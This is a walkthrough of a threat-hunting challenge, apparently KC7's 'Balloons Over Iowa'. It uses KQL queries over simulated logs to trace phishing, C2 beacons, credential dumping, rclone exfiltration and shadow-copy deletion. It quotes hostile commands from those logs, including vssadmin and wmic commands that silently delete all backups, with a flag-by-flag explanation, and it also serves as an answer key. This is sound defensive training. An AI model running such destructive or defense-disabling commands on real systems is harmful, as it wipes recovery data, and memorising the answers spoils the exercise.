# Balloons Over Iowa

## Section 1: KQL 101 🐣

Skipped

## Section 2: Aliens 👽

### 1: Which email address sent a message containing the domain invasion.xyz?

Before answering the question its best to look at data which we have. Since we need to look up an email we probably need Email table.

```sql
Email
| take 10
```

![balloons-over-iowa-1.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-1.png)

```sql
Email
| where link has 'invasion.xyz'
```

![balloons-over-iowa-2.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-2.png)

We have 2 emails with 1 unique sender.

### 2: How many users received email with links to the domain `invasion.xyz`?

From previous query we already know its 2 emails.

### 3: What was the subject of the email sent in (1)?

Also from previous query we have 2 same subject titles.

### 4: Who received the email in (1)? (Provide the email address of any of them)

Also from previous query we have 2 distinct recipients who work at iowaballoons.

### 5: What file (name) was sent as a link in the email in (1)?

```sql
Email
| where link has 'invasion.xyz'
| project link
```

Using same query, but lets only view `Link` column using _[project](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/project-operator)_ operator. In the results we seen an Excel file.

![balloons-over-iowa-3.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-3.png)

### 6: What is the IP of the user who clicked on the link from the email containing the domain invasion.xyz?

In tables we have OutboundNetworkEvents table which should have logs about visited urls by users/ips.

```sql
OutboundNetworkEvents
| where url has "Flight-Crew-Information.xls"
| project timestamp, src_ip, url
```

![balloons-over-iowa-4.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-4.png)

The first result url matches previously found url so we know this user clicked the link. 

### 7: What is the name of the user from (6)?

Because ip is unique to every user we can find them in Employees table easily.

```sql
let victim_ip = OutboundNetworkEvents
| where url has "Flight-Crew-Information.xls"
| project src_ip
| take 1;

Employees
| where ip_addr in (victim_ip)
| project name
```

![balloons-over-iowa-5.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-5.png)

> Note: KQL lets you store the results into variables using _[let](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/let-statement)_ keyword. Since the query returns Array even if we have 1 column and 1 row we need to use _[in](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/in-operator)_ operator (if something in array).
{ .prompt-tip }

> To use variables you need to select the statements correctly and run the query. If variable query is not selected session will not understand what you meant.
{ .prompt-info }

### 8: When did the the user in (6) click on the link? Provide an exact timestamp

We know the timestamp of when user visited the link from Question 6 query. 

### 9: What is the hostname of the user in (6)

We can refer to query from Question 7 and make change to narrow down search use `project hostname`.

### 10: Did the user in (6) download the file on the link? (yes/no)

We have a table related to files called FileCreationEvents which stores information related to files. 

Filter by 
1. Hostname: we know this from previous query, the user who visited the link.
2. Filename: we know filename from the emails.

```sql
FileCreationEvents
| where hostname == 'VRDA-MACHINE' 
| where filename == 'Flight-Crew-Information.xls' 
```

Results come empty, so its safe to say the file wasn't downloaded by user.

### 11: How many total emails were sent by the email address in (1)?

Since we already found the email from Question 1 we can filter for it.

```sql
Email
| where sender == 'tethys@pocketbook.xyz'
| count
```

### 12: How many unique filenames were sent by the email address in (1)?

While the question may seem easy the data we have is not exactly what we think.

```sql
Email
| where sender == 'tethys@pocketbook.xyz'
| distinct link
```

![balloons-over-iowa-6.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-6.png)

Here we see querying unique `link` fields, while it seems like we have 5 distinct **filenames** we only have 4 (second url is missing protocol).

To only get the filename we can leverage built in functions such as _[parse_path](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/parse-path-function)_

```sql
Email
| where sender == 'tethys@pocketbook.xyz'
| distinct tostring(parse_path(link).Filename)
```

![balloons-over-iowa-7.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-7.png)

> KQL returns _[dynamic](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/scalar-data-types/dynamic)_ type from `parse_path(link).Filename` that's why we need to explicitly convert it to string for proper filtering.
{ .prompt-info }

### 13: What domain did the email address in (1) use to target Richard Clements?

Using _[parse_url](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/parse-url-function)_ its easy to parse the domain from link field.

```sql
Email
| where sender == 'tethys@pocketbook.xyz'
| where recipient has 'richard'
| project parse_url(link).Host
```

> You can use `where (condition1) and (condition2) and ...` or just chain `where condition1 | where condition2 | ...`
{ .prompt-info }

![balloons-over-iowa-8.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-8.png)

### 14: When did Richard Clements click on the link sent by the sender in (1)?

We can find Richard's ip from his email from Email table.

```sql
OutboundNetworkEvents
| where src_ip == '192.168.2.197'
| where url has 'antennas-passers.com'
```

![balloons-over-iowa-9.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-9.png)

The query returns matching rows, which indicates that Richard visited the link.

### 15: When did Richard Clements download the file in the link?

Same approach as previous question, but instead of ip we first get hostname (machine name) and then look for matching file names.

```sql
FileCreationEvents
| where hostname == 'HNOA-LAPTOP'
| where filename has 'Flight-Crew-Information.xls'
```

![balloons-over-iowa-10.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-10.png)

Since we have a record that means Richard visited and downloaded the file.

### 16: What was the name of the file that Richard Clements downloaded (after clicking on the link?)

From previous question we already know the file name.

### 17: What file was observed on Richard Clement's machine immediately after he downloaded file in (16)? Provide the full path

From question 16's query we have absolute path to file.

### 18: What was the Sha256 hash of the file in (17)?

From question 16's query we have sha256 hash signature for file.

### 19: The hash in (18) can be found on virustotal.com. Virustotal is a malware repository used by many security researchers. What is the reported name of this file on Virustotal?

[3666cb55d0c4974bfee855ba43d596fc6d10baff5eb45ac8b6432a7d604cb8e9](https://www.virustotal.com/gui/file/3666cb55d0c4974bfee855ba43d596fc6d10baff5eb45ac8b6432a7d604cb8e9)

![balloons-over-iowa-11.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-11.png)

### 20: What is the popular threat label for the file in (18) on Virustotal.com?

![balloons-over-iowa-12.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-12.png)

### 21: How many processes were spawned on Richard Clement's machine by the file in (18)?

Using ProcessEvents table we can query for processes. Since the infected file is xls file, then after opening it some payload must have been ran. This makes xls file the perpetrator and we can query processses by parent hash (xls in this case).

![balloons-over-iowa-13.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-13.png)

### 22: The file in (18) established a remote connection from Richard Clement's machine to an external IP over port 443. What was this IP?

From previous query we saw command `rundll32.exe 118.3.14.33:443`.

### 23: Shortly after the malware ran, the attackers came back to Richard's machine to enumerate Enterprise Admins. What command did they run?

We know what they enumerated for so let's use that as a keyword.

```sql
ProcessEvents
| where hostname == 'HNOA-LAPTOP'
| where process_commandline has 'Enterprise Admins'
```

![balloons-over-iowa-14.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-14.png)

### 24: What commands did the attacks run to dump credentials on Richard's machine?

If you ever did a pentest on a Windows machine then you know that most popular tool to dump credentials is _[mimikatz](https://github.com/ParrotSec/mimikatz)_. With some light google searches you will find it with ease.

```sql
ProcessEvents
| where hostname == 'HNOA-LAPTOP'
| where process_commandline has 'mimikatz'
```

![balloons-over-iowa-15.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-15.png)

Alternative way to find the process is to filter by previous parent process hash, because we know that attacker spawned that processes for command execution. Add additional filter for process_name for less/precise results.

```sql
ProcessEvents
| where hostname == 'HNOA-LAPTOP'
| where parent_process_hash == '614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f'
| where process_name in ('cmd.exe', 'powershell.exe')
```

![balloons-over-iowa-16.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-16.png)

> Keep in mind that the answer is not copy pasta of `process_commandline`
{ .prompt-info }

### 25: The attackers enumerated the contents of this folder (name) on Richard's machine and dumped the contents to a text file

Using previous answer's second query we can find the file.

`C:\Windows\system32\cmd.exe /C dir “\\BalloonSecrets\C$” /s >> mylist.txt`

### 26: How many machines have similar commands connecting to C2 (command and control) channels as those observed in (22)?

From question 22 we know that connection was make using `rundll32.exe` on `IP:443`. If we filter by port we can identify the C2 servers.

```sql
ProcessEvents
| where process_commandline has ':443'
| distinct hostname
| count
```

To be honest I dont like this method, because what if port is different and we missed a server?

We can utilize [matches regex](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/matches-regex-operator) operator to query for `process_commandline` that start with `rundll32` and contain IP address.

```sql
ProcessEvents
| where process_commandline matches regex @"rundll32.exe.*(\d{1,3}\.){3}\d{1,3}"
| distinct hostname
| count
```

![balloons-over-iowa-17.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-17.png)

### 27: How many unique implants were used to establish these C2 connections?

The question is a bit tricky, because the immediate thought might be to get distinct `process_commandline` (unique C2 connections), but that would be wrong. The implants in this case mean how many unique processes are spawned.

Modify previous query from `| distinct hostname` -> `| distinct parent_process_hash`

### 28: One of these C2 connections was observed on hostname 0KYU-DESKTOP. When did this occur?

We know that C2 servers are created by `rundll32.exe` process and given hostname narrows down the search.

![balloons-over-iowa-18.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-18.png)

```sql
ProcessEvents
| where hostname == '0KYU-DESKTOP'
| where process_name == 'rundll32.exe'
```

### 29: On hostname 0KYU-DESKTOP, attackers ran this command to delete data backups

Since we are dealing with `delete` operation we can filter by this keyword.

```sql
ProcessEvents
| where hostname == '0KYU-DESKTOP'
| where process_commandline has 'delete'
```

![balloons-over-iowa-19.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-19.png)

#### Quick breakdown of commands

##### `vssadmin.exe Delete Shadows /all /quiet`

`vssadmin.exe` is used to manage Volume Shadow Copies (VSS) on a Windows system.<br>
Shadow copies are often used for backup and restore operations, system protection, or application rollbacks. Deleting them can impact these functionalities.

-   **vssadmin.exe**: This is a command-line tool included in Windows that allows you to interact with VSS, a technology that creates snapshots of volumes at specific points in time.
-   **Delete Shadows**: This specifies the action you want to perform, which is deleting shadow copies.
-   **/all**: This flag tells the command to delete **all** existing shadow copies on the system.
-   **/quiet**: This flag suppresses any confirmation prompts or progress information, making the operation silent.

**In essence, this command will silently delete all Volume Shadow Copies present on your system.**

#### `wmic.exe Shadowcopy Delete`

The command `wmic.exe Shadowcopy Delete` achieves the same result as `vssadmin.exe Delete Shadows /all /quiet`:  silently deleting all Volume Shadow Copies (VSCs) on your Windows system.

-   **wmic.exe**: This is another command-line tool available in Windows. It interacts with Windows Management Instrumentation (WMI), a framework for managing and monitoring operating system components.
-   **Shadowcopy**: This specifies the WMI class you're interacting with, which handles VSCs.
-   **Delete**: This defines the action you want to perform, which is deleting the shadow copies. 

### 30: It is likely that the observed actor (the one responsible for activity seen in 29) conducted this type of destructive attack.

The question is asking what type of attack was conducted. From previous question we found out that all backup snapshots were deleted  and deleting VSCs is sometimes observed in **ransomware** attacks to prevent easy file recovery.

## Section 3: TopSecret 🤫

### 1: On 2023-02-19 at 05:02, Son Johnson downloaded a suspicious Word document file. What was the name of this file?

Since we know the (almost) exact timestamp of event we can narrow down the filter. [between](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/between-operator) operator is handy for such cases combined with [datetime](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/scalar-data-types/datetime) objects.

```sql
FileCreationEvents
| where timestamp between (datetime('2023-02-19 05:02:00') .. datetime('2023-02-19 05:03:00')) 
```

![balloons-over-iowa-20.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-20.png)

> Since the query only returns 1 row and username matches description there's no need for further filters. If there were more data you would narrow down data by `hostname` or `username`.
{ .prompt-info }

### 2: From which domain did Son Johnson download the file identified in (1)?

We can filter `OutboundNetworkEvents` table by filename in url, but that gives us too many results. We only need url which Son Johnson downloaded file from. Using subquery we can filter `Employees` by hostname (or any field), take ip_addr and filter based on that combined with filename.

```sql
OutboundNetworkEvents
| where src_ip in (Employees | where hostname == 'ITOZ-MACHINE' | project ip_addr)
| where url has 'Flight-Crew-Information.docx'
```

![balloons-over-iowa-21.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-21.png)

> Question is about domain, not full url.
{ .prompt-info }

### 3: What IP address does the domain identified in (2) resolve to?

To get the IP of a domain we need our freind [DNS](https://developer.mozilla.org/en-US/docs/Glossary/DNS).

```sql
PassiveDns
| where domain == 'espionage.com'
```

![balloons-over-iowa-22.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-22.png)

### 4: What time was the resolution seen in (3) recorded in Passive DNS data? (enter exact timestamp)

Can be extracted from Question 4.

### 5: What other Top Level Domain (TLD) such as .com, .org etc. is used by the domains hosted on the IP identified in (3)?

[TLD](https://developer.mozilla.org/en-US/docs/Glossary/TLD) refers to last (rightmost) part of full domain.<br>
Using [split](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/split-function) we can split the `domain` string, extract second item (TLD) and convert to string for correct query.

```sql
PassiveDns
| where ip == '131.102.77.156'
| distinct tostring(split(domain, '.')[1])
```

![balloons-over-iowa-23.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-23.png)

### 6: How many domains resolve to the IP identified in (3)?

```sql
PassiveDns
| where ip == '131.102.77.156'
| distinct domain
| count
```

![balloons-over-iowa-24.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-24.png)

### 7: One of the domains identified in (6) resolves to an IP that starts with 194. What is this IP?

```sql
let susDomains = PassiveDns
| where ip == '131.102.77.156'
| distinct domain;

PassiveDns
| where domain in (susDomains)
| where ip startswith "194"
```

![balloons-over-iowa-25.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-25.png)

[startswith](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/not-startswith-operator) operator is good utility function to use in this case.

> To use variable inside second query both queries must be selected.
{ .prompt-info }

### 8: The attackers performed reconnaisance against our organization using the IP identified in (7). As part of this reconnaissance, the attackers searched for a three-word phrase. What was this phrase?

Since recon was done on "our" organization we need to look into `InboundNetworkEvents` table for incoming requests. If we filter by IP and take only urls we get 3 results. From description we know that last row is most probably the url we need.

```sql
InboundNetworkEvents
| where src_ip == '194.235.79.0'
| project url
```

![balloons-over-iowa-26.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-26.png)

> `%20` is [URLEncoded](https://www.wikiwand.com/en/Percent-encoding) Space character
{ .prompt-info }

### 9: Just before downloading the file identified in (1), Son Johnson browsed to a domain. What was this domain?

So we need to know what happened before Johnson clicked on that url. We could have filtered by datetime, but that's not fun. <br>
I found [rows_near](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/rows-near-plugin) plugin which will ease the findings.

```sql
OutboundNetworkEvents 
| where src_ip == '192.168.2.26' // Johnson IP
| serialize // Required For rows_near 
| evaluate rows_near(url has 'Flight-Crew-Information.docx', 1) // Condition, Rows Before, Rows After
```

![balloons-over-iowa-27.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-27.png)

Seems like Johnson didnt click on the link, but rather he was redirected to this website.

### 10:

My initial answer was [Open Redirection](https://portswigger.net/kb/issues/00500100_open-redirection-reflected) attack, where if victim visits link they get redirected to malicious website, but the answer was wrong.

If we take a closer look at timestamps:

| Event                   | Timestamp                  |
| ----------------------- | -------------------------- |
| Visited Redirection URL | 2023-02-19T05:02:21.22982Z |
| Visited Malicious URL   | 2023-02-19T05:02:57.22982Z |
| File Downloaded         | 2023-02-19T05:02:57.22982Z |

So when the user got to the malicious url the download was instantly started. This attack is known as [Drive-by download
](https://www.wikiwand.com/en/Drive-by_download), but the answer is still incorrect.

Looking around in Discord:

![balloons-over-iowa-28.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-28.png)

The attack is explained in: [Business Insider: SolarWinds Hack 2020](https://www.businessinsider.com/solarwinds-hack-explained-government-agencies-cyber-security-2020-12)

> _In early 2020, hackers secretly broke into Texas-based SolarWind's systems and added malicious code into the company's software system. The system, called "Orion," is widely used by companies to manage IT resources. Solarwinds has 33,000 customers that use Orion, according to SEC documents._

***[Watering Hole Attack](https://www.fortinet.com/resources/cyberglossary/watering-hole-attack)*** _A watering hole attack is a form of cyberattack that targets groups of users by infecting websites that they commonly visit._

This means that `blimpgoespop.com` domain is a legit domain which had its software altered to make Redirection possible to malicious sites.

Watering Hole -> Open Redirection -> Drive-by download

### 11: How many different domains did the attackers use in this kind of attack? (The attack type identified in [10])

We know that `blimpgoespop.com` is used as a Watering Hole, since its a rare attack we can deduct that this was the only domain effected with this attack.

```sql
OutboundNetworkEvents
| where url has 'https://blimpgoespop.com?redirect'
| distinct tostring(split(url, '=')[1])
| count
```

### 12: How many employees at Balloons Over Iowa were victims of this kind of attack? (The attack type identified in [10])

Modify previous query, but get distinct IPs to identify unique users.

```sql
OutboundNetworkEvents
| where url has 'https://blimpgoespop.com?redirect'
| distinct src_ip
| count
```

### 13: How many different employee roles did the attackers target using this type of attack? (The attack type identified in [10])

We can store the previous query into variable and then filter Employees by the IPs, and finally get unique roles count.

```sql
let targetedIps = OutboundNetworkEvents
| where url has 'https://blimpgoespop.com?redirect'
| distinct src_ip;
Employees
| where ip_addr in (targetedIps)
| distinct role
| count
```

### 14: You have received an alert that this employees' device, - hostname 3CIU-LAPTOP - may have malware on it involving this hash: 4c199019661ef7ef79023e2c960617ec9a2f275ad578b1b1a027adb201c165f3 that was the parent of suspicious processes. What is the name of the file?

```sql
ProcessEvents
| where hostname == '3CIU-LAPTOP'
| where parent_process_hash == '4c199019661ef7ef79023e2c960617ec9a2f275ad578b1b1a027adb201c165f3'
| distinct parent_process_name
```

![balloons-over-iowa-29.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-29.png)

### 15: What is the username associated with the device found in 14?

We can modify previous query to show `username`

### 16: What is the role of (15) in the organization?

```sql
Employees
| where username == 'juwells'
| project role
```

![balloons-over-iowa-30.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-30.png)

### 17: You observe that this the file (from 14) is launching a process on 3CIU-LAPTOP named rundll32.exe with an external IP address. What is that IP address?

```sql
ProcessEvents
| where hostname == '3CIU-LAPTOP'
| where process_commandline startswith 'rundll32.exe'
| project process_commandline
```

![balloons-over-iowa-31.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-31.png)

### 18: What does this connection (from 17) indicate? (one of the phases of the kill chain)

> ***[The Cyber Kill](https://www.crowdstrike.com/cybersecurity-101/cyber-kill-chain/)*** _chain is an adaptation of the military’s kill chain, which is a step-by-step approach that identifies and stops enemy activity._

![https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/photo/cyber/THE-CYBER-KILL-CHAIN-body.png.pc-adaptive.full.medium.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-32.png)

We already saw step 5 `Installation` using Watering Hole attack, now the attackers setup connection to their Command and Control (C2) server (Step 6).

### 19: Investigating compromised devices in the org you find malicious activity using a tool called rclone. What domain is listed in its command line on Julie Well's device?

> [Rclone](https://github.com/rclone/rclone) ("rsync for cloud storage") is a command-line program to sync files and directories to and from different cloud storage providers.

```sql
ProcessEvents
| where username == 'juwells'
| where process_commandline has 'rclone'
| project process_commandline
```

![balloons-over-iowa-33.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-33.png)

### 20: What IP address does (19) resolve to?

```sql
PassiveDns
| where domain == 'infiltrate.air'
```

![balloons-over-iowa-34.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-34.png)

### 21: How many total domains have also resolved to this IP (the one found in 20)?

```sql
PassiveDns
| where ip == '131.102.77.156'
| count
```

### 22: What does the command found in (19) represent? (Hint: It's a MITRE ATT&CK Tactic)

Quick google search shows that `rclone` is used in Data Exfiltration. 

[Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002/)

### 23: How many other devices on the org had similar threat activity using rclone on them?

```sql
ProcessEvents
| where process_commandline has 'rclone.exe copy'
| distinct hostname
| count 
```

### 24: The attackers disabled Defender (antivirus) on some devices in the network. How many systems did they do this on?

Quick search lead me to StackOverflow: [How do I turn off Windows Defender from the command line?](https://superuser.com/a/1047031)

```sql
ProcessEvents
| where process_commandline has 'DisableRealtimeMonitoring'
| distinct hostname
| count 
```

### 25: A member of your investigation team reported that host GWB7-DESKTOP was compromised. What is the timestamp of the earliest suspicious process event you observe on this device? (Paste full timestamp)

If we observe the `process_commandline` most of the commands ran by system use absolute path, but commands can also be called without full path and this is what most users do. If we filter aginst `C:` in process_commandline we can observe the user interaction.

```sql
ProcessEvents
| where hostname == 'GWB7-DESKTOP'
| where not(process_commandline has 'C:')
| project-away parent_process_hash
```

![balloons-over-iowa-35.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-35.png)

The first suspect is processed called by `blimp.exe`.

### 26: What is the command and control (C2) IP address observed on GWB7-DESKTOP

```sql
ProcessEvents
| where hostname == 'GWB7-DESKTOP'
| where process_commandline startswith "rundll32.exe"
| project process_commandline
```

![balloons-over-iowa-36.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-36.png)

### 27: What is the timestamp of the earliest Passive DNS resolution seen on the IP found in (26)?

```sql
PassiveDns
| where ip == '179.175.35.248'
```

![balloons-over-iowa-37.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-37.png)
 
### 28: Which of the domains hosted on the IP found in (26) resolve to the most number of unique IPs? If there is a tie, enter any one of the domains.

We already know the domains, what we need is how many ips reference that domain. [summarize](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/summarize-operator) operator is handy for aggregating data, combined with [count](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/count-aggregation-function) function.

```sql
let susDomains = PassiveDns
| where ip == '179.175.35.248'
| distinct domain;
PassiveDns
| where domain in (susDomains)
| summarize domain_count = count() by domain
| sort by domain_count
```

![balloons-over-iowa-38.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-38.png)

### 29: What is the domain using the ".air" TLD that resolves to the IP found in (26)?

It can be found using previous query.

### 30: The domain found in (29) resolves to an IP that starts with "144." What is the hostname on which this IP was used for command and control?

For dynamic result I decided to use a big query to automatically get the answer.

```sql
let susDomains = PassiveDns
| where ip == '179.175.35.248'
| distinct domain;

let C2_server = PassiveDns
| where domain in (susDomains)
| summarize domain_count = count() by domain, ip
| where ip startswith "144"
| project ip;

ProcessEvents
| where process_commandline has_any (C2_server)
| project process_commandline, hostname
```

![balloons-over-iowa-39.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-39.png)

> Select whole query to run without errors.
{ .prompt-info } 

## Section 4: Helpdesk ☎️

### 1: How many emails contained the domain "database.io"?

```sql
Email
| where link has 'database.io'
| count 
```

### 2: What IP does the domain "database.io" resolve to

```sql
PassiveDns
| where domain =~ 'database.io'
```

![balloons-over-iowa-40.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-40.png)

> [=~](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/equals-operator) is to disable case sensitivity (Domain starts with capital D)
{ .prompt-info }

### 3: How many domains resolve to the same Ip as "database.io"?

```sql
PassiveDns
| where ip == '176.167.219.168'
| count
```

### 4: How many emails contained domains sharing the same IP as "database.io"?

[has_any](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/has-any-operator) can be used to check keywords from array in field.

```sql
let susDomains = PassiveDns
| where ip == '176.167.219.168'
| project domain;
Email
| where link has_any (susDomains)
| count 
```

### 5: What was the most prevalent sender of emails seen in (4)?

We can use previous query, but without `count` to see the rows. `SSL@hotmail.com` seems most suspicious considering its not company email and its writing comapny employees about System Failures.

### 6: How many total emails were sent by the sender in (5)?

```sql
Email
| where sender == 'SSL@hotmail.com'
| count
```
 
### 7: What was the most prevalent email subject used by the sender in (5)?

We can filter by email and aggregate by subject's count.

```sql
Email
| where sender == 'SSL@hotmail.com'
| summarize count() by subject
```

![balloons-over-iowa-41.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-41.png)

### 8: Which user named Carolyn clicked on a link containing the domain "hardware.com"? (Provide full name)

```sql
let usersThatVisitedWebsite = OutboundNetworkEvents
| where url has 'hardware.com'
| project src_ip;
Employees
| where ip_addr in (usersThatVisitedWebsite)
```

![balloons-over-iowa-42.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-42.png)

### 9: What attacker IP was used to login to Carolyn's account after she clicked the link?

For Login events we can refer to `AuthenticationEvents` table, since we know username and that there was a successful login search narrows down.

```sql
AuthenticationEvents
| where username == 'caschaeffer'
| where result == 'Successful Login'
```

![balloons-over-iowa-43.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-43.png)

`171.250.201.103` ip looks out of place, it doesn't belong to private ip range.

### 10: How many accounts did the attacker try to log into (successfully or unsuccessfully) from the IP in (9)?

Intellsense suggested to use [has_ipv4](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/has-ipv4-function) function instead of regular [has](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/has-operator) since we are working with ip addresses.

```sql
AuthenticationEvents
| where has_ipv4(src_ip, '171.250.201.103')
| count 
```

### 11: What filename did the attackers use to exfiltrate data from Carolyn's email? (Hint: Look at the parameters in the URL)

```sql
InboundNetworkEvents
| where has_ipv4(src_ip, '171.250.201.103')
| project url
```

![balloons-over-iowa-44.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-44.png)

### 12: When did the attackers exfiltrate data from Carolyn's email? (exact timestamp)

We learned about this from previous answer.

### 13: What IP does the domain 'hardware.com' resolve to?

```sql
PassiveDns
| where domain =~ 'hardware.com'
```

### 14: This IP (from question 13) is used to find out information about the company. What is the first URL the attackers browsed to from this IP?

```sql
InboundNetworkEvents
| where src_ip == '53.85.224.235'
| project url
```

![balloons-over-iowa-45.png](/assets/soc/kc7cyber/balloons-over-iowa/balloons-over-iowa-45.png)

### 15: What is this type of research technique (from 14) called?

Since there are no signs of exploitation type queries then the attacker simply enumerated the website, aka known as Reconnaissance (first step of Kill Chain).

## Section 5: Security Jeopardy 🎤

### 1: In this type of attack, adversaries compromise software developers, hardware manufacturers, or service providers and use that access to target downstream users of the software, hardware, or service. Solarwinds was impacted by this type of compromise in 2020.

From Section 10, Question 10 we already know about the revelant attack, but we have to look at the bigger picture. Watering Hole attack is one of the stages of Supply Chain attack.

[The Untold Story of the Boldest Supply-Chain Hack Ever](https://www.wired.com/story/the-untold-story-of-solarwinds-the-boldest-supply-chain-hack-ever/)

### 2: Attackers often use this legitimate Windows feature as a way to establish persistence on a compromised device.

[Scheduled Task](https://learn.microsoft.com/en-us/windows/win32/taskschd/schtasks) is most common way to establish persistence on Windows machine, its builtins so no extra installation is needed.

### 3: In an --- phishing attack, an attacker may steal credentials or cookies to bypass multi-factor authentication and gain access to critical systems.

To me this immediately seems liked [Session Hijack](https://www.imperva.com/learn/application-security/session-hijacking/#) attack, but using this attack the attacker can only steal Session Cookies and they can't steal credentials (AFAIK). <br>
After taking the description and just straight up googling, we are met with flashy LinkedIn Post: [AiTM Phishing Attacks: Stolen Session Cookie Creates Havoc in Financial Organizations](https://www.linkedin.com/pulse/aitm-phishing-attacks-stolen-session-cookie-creates-havoc-financial/)

An Adversary-in-the-Middle (AiTM) phishing attack is a sophisticated variant of a traditional phishing scam. Here's the gist:

 How it works:
1.  **Phishing email:** The attacker lures the victim with a convincing email or message, tricking them into clicking a malicious link.
2.  **Fake website:** Clicking the link leads to a fake website disguised as a legitimate one (e.g., bank, social media). It looks real, but it's controlled by the attacker.
3.  **Intercepting data:** When the victim enters their credentials (username, password), the attacker intercepts them **without** needing to bypass multi-factor authentication (MFA). This is because they act as a middleman, relaying the data between the victim and the real website while silently stealing it.

Key features:
- **Bypasses MFA:** Unlike traditional phishing, AiTM attacks can steal your login even with MFA (Multi-Factor Authentication) enabled.
- **Highly convincing:** The fake website appears nearly identical to the real one, making it harder to detect.
- **Growing threat:** AiTM attacks are becoming increasingly common and pose a significant risk to individuals and organizations. 

### 4: When using this technique, attackers guess many combinations of usernames and passwords in an attempt to access a system

[Brute Force](https://www.imperva.com/learn/application-security/brute-force-attack/) attack is basically just guessing attack. 

### 5: A attack is when an attacker uses common passwords to try to gain access to multiple accounts in a single environment

Technique when attacker tests weak password is called Password Spraying.<br>
More about attack: [Password Spray](https://www.kaspersky.com/resource-center/definitions/what-is-password-spraying)

### 6: This type of malware is designed to permanently erase data from an infected system

_**Wiper** malware is malicious software specifically created to wipe or destroy data on a targeted computer or network. Unlike some other types of malware that aim to steal information or disrupt operations temporarily, wiper malware is destructive in nature and seeks to cause irreparable harm by deleting or overwriting files, making the data unrecoverable._

### 7: This is a collection of databases for configuration settings for the Windows operating system

_The collection of databases for configuration settings for the Windows operating system is commonly referred to as the "**[Windows Registry](https://learn.microsoft.com/en-us/windows/win32/sysinfo/structure-of-the-registry)**." The Windows Registry is a hierarchical database that stores configuration settings and options for the Microsoft Windows operating system. It is a central repository where information about the system, hardware, software, and user preferences is stored._

### 8: This describes techniques used by attackers to communicate with systems they control within a victim network.

We already encounter this type of attack, its part of the Kill Chain, step 6. A C2 server.

### 9: This happens when malware or a malicious actor carries out an unauthorized transfer of data from a system

_**[Data exfiltration](https://www.imperva.com/learn/data-security/data-exfiltration/)** refers to the unauthorized transfer or extraction of sensitive information, such as intellectual property, trade secrets, or personal data, from a computer system or network._

### 10: What binary-to-text encoding scheme is used to convert "hello world" to "aGVsbG8gd29ybGQ="

The most popular simple encoding scheme you can meet is probably [Base64](https://www.wikiwand.com/en/Base64)

We can easily verify this:

```bash
└─$ echo -n 'hello world' | base64
